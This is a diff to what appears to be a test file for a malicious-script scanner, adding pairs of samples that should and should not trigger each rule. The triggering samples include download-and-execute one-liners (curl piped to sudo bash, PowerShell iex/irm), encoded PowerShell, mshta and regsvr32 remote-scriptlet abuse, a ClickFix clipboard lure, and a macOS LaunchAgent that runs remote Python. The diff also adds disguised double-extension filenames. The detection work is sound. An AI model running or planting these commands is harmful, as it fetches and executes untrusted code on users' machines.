@@ -205,6 +205,52 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
         ),
         ("script_chmod_execute", b"chmod +x setup.sh\n./setup.sh\n", b"chmod +x setup.sh\n"),
         (
+            "script_chmod_execute",
+            b"chmod 755 ./setup.sh && ./setup.sh\n",
+            b"chmod 755 /srv/www && systemctl restart nginx\n",
+        ),
+        (
+            "script_download_execute",
+            b"curl -sL https://example.invalid/x | sudo -E bash\n",
+            b"curl -LO https://example.invalid/kubectl | sudo tee /usr/local/bin/kubectl\n",
+        ),
+        (
+            "script_download_execute",
+            b"iex (irm https://example.invalid/x)\n",
+            b"irm https://example.invalid/api | ConvertFrom-Json\n",
+        ),
+        (
+            "script_encoded_powershell",
+            b"powershell -nop -ep unrestricted -enc " + encoded.encode() + b"\n",
+            b"powershell -ep unrestricted -File backup.ps1\n",
+        ),
+        (
+            "script_mshta_remote",
+            b'mshta vbscript:Execute("CreateObject(""WScript.Shell"")")\n',
+            b"mshta can run vbscript: URLs, which is why it is blocked.\n",
+        ),
+        (
+            "script_regsvr32_remote_scriptlet",
+            b"regsvr32 -s -n -u -i:https://example.invalid/a.sct scrobj.dll\n",
+            b"regsvr32 -s -i:C:\\x\\a.sct scrobj.dll\n",
+        ),
+        (
+            "web_clickfix_lure",
+            b"<p>Verification required. Open File Explorer and paste the command in the "
+            b"address bar.</p><script>navigator.clipboard.write("
+            b'[new ClipboardItem({"text/plain": b})]);</script>',
+            b"<button onclick='navigator.clipboard.writeText(url)'>Copy link</button>"
+            b"<p>Open File Explorer and paste the path into the address bar.</p>",
+        ),
+        (
+            "script_launchagent_shell",
+            b"<plist><dict><key>ProgramArguments</key><array><string>/usr/bin/python3</string>"
+            b"<string>-c</string><string>import urllib.request;exec(urllib.request.urlopen("
+            b"'https://example.invalid').read())</string></array></dict></plist>",
+            b"<plist><dict><key>ProgramArguments</key><array><string>/usr/bin/python3</string>"
+            b"<string>/Users/me/backup.py</string></array></dict></plist>",
+        ),
+        (
             "script_fetch_chmod_run",
             b"curl -fsSLo /tmp/u https://example.invalid/u && chmod +x /tmp/u && /tmp/u\n",
             b"curl -LO https://example.invalid/kubectl && chmod +x kubectl"
@@ -313,6 +359,8 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
         ),
         ("heuristic_double_extension", b"hello\n", b"hello\n"),
         ("heuristic_double_extension_launcher", b"hello\n", b"hello\n"),
+        ("heuristic_double_extension_image", b"hello\n", b"hello\n"),
+        ("heuristic_double_extension_package", b"hello\n", b"hello\n"),
         ("heuristic_filename_control", b"hello\n", b"hello\n"),
         (
             "heuristic_document_executable",
@@ -388,9 +436,16 @@ def main() -> None:
         for rule_id, fire, miss in pairs():
             if rule_id == "container_disk_image_dmg":
                 rule_id = "container_disk_image"
-            # A launcher suffix after a decoy; script names after .html stay clean.
-            launcher = rule_id == "heuristic_double_extension_launcher"
+            # A launcher suffix after a decoy; script names after .html stay clean. A disk
+            # image or app package after a decoy; a plain disk image or archive stays clean.
+            disguises = {
+                "heuristic_double_extension_launcher": ("invoice.pdf.lnk", "page.html.js"),
+                "heuristic_double_extension_image": ("photo.jpg.iso", "backup.iso"),
+                "heuristic_double_extension_package": ("statement.pdf.msix", "report.pdf.zip"),
+            }
+            launcher = rule_id in disguises
             if launcher:
+                disguise_names = disguises[rule_id]
                 rule_id = "heuristic_double_extension"
             fire_name = "photo.png.app" if rule_id == "heuristic_double_extension" else "fire.bin"
             miss_name = "photo.png" if rule_id == "heuristic_double_extension" else "miss.bin"
@@ -412,7 +467,7 @@ def main() -> None:
             if rule_id in doc_names:
                 fire_name, miss_name = doc_names[rule_id]
             if launcher:
-                fire_name, miss_name = "invoice.pdf.lnk", "page.html.js"
+                fire_name, miss_name = disguise_names
             fire_ids = _scan(root, rules, fire_name, fire)
             miss_ids = _scan(root, rules, miss_name, miss)
             if rule_id not in fire_ids:
